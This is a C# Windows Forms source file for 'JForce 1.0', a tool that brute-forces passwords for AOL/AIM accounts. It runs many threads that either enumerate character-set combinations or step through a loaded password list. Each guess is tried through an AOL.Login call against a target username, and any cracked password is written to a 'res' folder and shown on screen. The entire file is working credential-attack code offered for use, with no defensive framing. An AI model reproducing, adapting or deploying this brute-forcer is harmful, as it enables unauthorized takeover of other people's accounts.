using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace AIM_JForce
{
    public partial class frmMain : Form
    {
        // Variables
        private Bruteforce brute = new Bruteforce();
        private Stopwatch bruteforce_counter;
        private bool bruteforce_running = false;
        private string bruteforce_settings_list = "";
        private int bruteforce_settings_maxthreads = Environment.ProcessorCount;
        List<Thread> bruteforce_threads = new List<Thread>();
        private string[] list_passwords;
        private int list_counter = 0;

        // Threads
        private void RecursiveBruteforceThread()
        {
            while (true)
            {
                if (bruteforce_running)
                {
                    string pass = brute.GetNext();
                    this.Text = "JForce 1.0 - running (" + pass + ")";
                    if (AOL.Login(bruteforce_username.Text, pass))
                    {
                        bruteforce_counter.Stop();
                        bruteforce_running = false;
                        string buffer = "Password for " + bruteforce_username.Text + " has been found!\n\nPassword: " + pass + "\nAttempts: " + brute.counter + "\nElapsed Time: " + bruteforce_counter.Elapsed.ToString();
                        if (!Directory.Exists("res"))
                            Directory.CreateDirectory("res");
                        File.WriteAllText("res\\" + bruteforce_username.Text, buffer);
                        MessageBox.Show(buffer + "\n\nThis information has been saved to the 'res' folder in case you might need it again.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        bruteforce_toggle_Click(0, new EventArgs());
                    }
                }
            }
        }
        private void ListBruteforceThread()
        {
            while (true)
            {
                if (bruteforce_running)
                {
                    string pass = list_passwords[(list_counter += 1)];
                    this.Text = "JForce 1.0 - running (" + pass + ")";
                    if (AOL.Login(bruteforce_username.Text, pass))
                    {
                        bruteforce_counter.Stop();
                        bruteforce_running = false;
                        string buffer = "Password for " + bruteforce_username.Text + " has been found!\n\nPassword: " + pass + "\nAttempts: " + (list_counter + 1) + "\nElapsed Time: " + bruteforce_counter.Elapsed.ToString();
                        if (!Directory.Exists("res"))
                            Directory.CreateDirectory("res");
                        File.WriteAllText("res\\" + bruteforce_username.Text, buffer);
                        MessageBox.Show(buffer + "\n\nThis information has been saved to the 'res' folder in case you might need it again.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        bruteforce_toggle_Click(0, new EventArgs());
                    }
                }
            }
        }

        // Constructor
        public frmMain()
        {
            // Draw frmMain
            InitializeComponent();

            // Setup
            CheckForIllegalCrossThreadCalls = false;
            brute.min = 8;
            brute.max = 16;
        }

        // Button Events
        private void bruteforce_settings_browse_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "Open a password list..";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                bruteforce_settings_list = ofd.FileName;
                list_passwords = File.ReadAllLines(bruteforce_settings_list);
                list_counter = -1;
            }
        }
        private void bruteforce_pause_Click(object sender, EventArgs e)
        {
            bruteforce_running = false;
            bruteforce_pause.Enabled = false;
            bruteforce_resume.Enabled = true;
        }
        private void bruteforce_resume_Click(object sender, EventArgs e)
        {
            bruteforce_running = true;
            bruteforce_pause.Enabled = true;
            bruteforce_resume.Enabled = false;
        }
        private void bruteforce_toggle_Click(object sender, EventArgs e)
        {
            bruteforce_running = (bruteforce_toggle.Text == "Start");
            if (bruteforce_running)
            {
                string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                if (bruteforce_settings_usenums.Checked)
                    charset += "1234567890";
                if (bruteforce_settings_usespecialchars1.Checked)
                    charset += "!@#$%&&*_-+=,.";
                if (bruteforce_settings_usespecialchars2.Checked)
                    charset += "<^>?/;:'\"[]{ }|\\";
                brute.charset = charset;
                brute.counter = 0;

                bruteforce_counter = Stopwatch.StartNew();
                bruteforce_toggle.Text = "Stop";
                bruteforce_pause.Enabled = true;
                bruteforce_resume.Enabled = false;
                bruteforce_username.Enabled = false;

                bruteforce_threads.Clear();
                for (int i = 0; i < bruteforce_settings_maxthreads; i++)
                {
                    if (bruteforce_ispure.Checked)
                        bruteforce_threads.Add(new Thread(RecursiveBruteforceThread));
                    else if (bruteforce_islist.Checked)
                        bruteforce_threads.Add(new Thread(ListBruteforceThread));
                    bruteforce_threads[i].Start();
                }
            }
            else
            {
                bruteforce_toggle.Text = "Start";
                bruteforce_pause.Enabled = false;
                bruteforce_resume.Enabled = false;
                bruteforce_username.Enabled = true;

                for (int i = 0; i < bruteforce_settings_maxthreads; i++)
                {
                    bruteforce_threads[i].Abort();
                    while (bruteforce_threads[i].ThreadState == System.Threading.ThreadState.Running)
                        Application.DoEvents();
                }
                bruteforce_threads.Clear(); 
            }
        }

        // RadioButton Events
        private void bruteforce_ispure_CheckedChanged(object sender, EventArgs e)
        {
            bruteforce_settings_browse.Visible = false;
            bruteforce_settings_usenums.Visible = true;
            bruteforce_settings_usespecialchars1.Visible = true;
            bruteforce_settings_usespecialchars2.Visible = true;
        }
        private void bruteforce_islist_CheckedChanged(object sender, EventArgs e)
        {
            bruteforce_settings_browse.Visible = true;
            bruteforce_settings_usenums.Visible = false;
            bruteforce_settings_usespecialchars1.Visible = false;
            bruteforce_settings_usespecialchars2.Visible = false;
        }
    }
}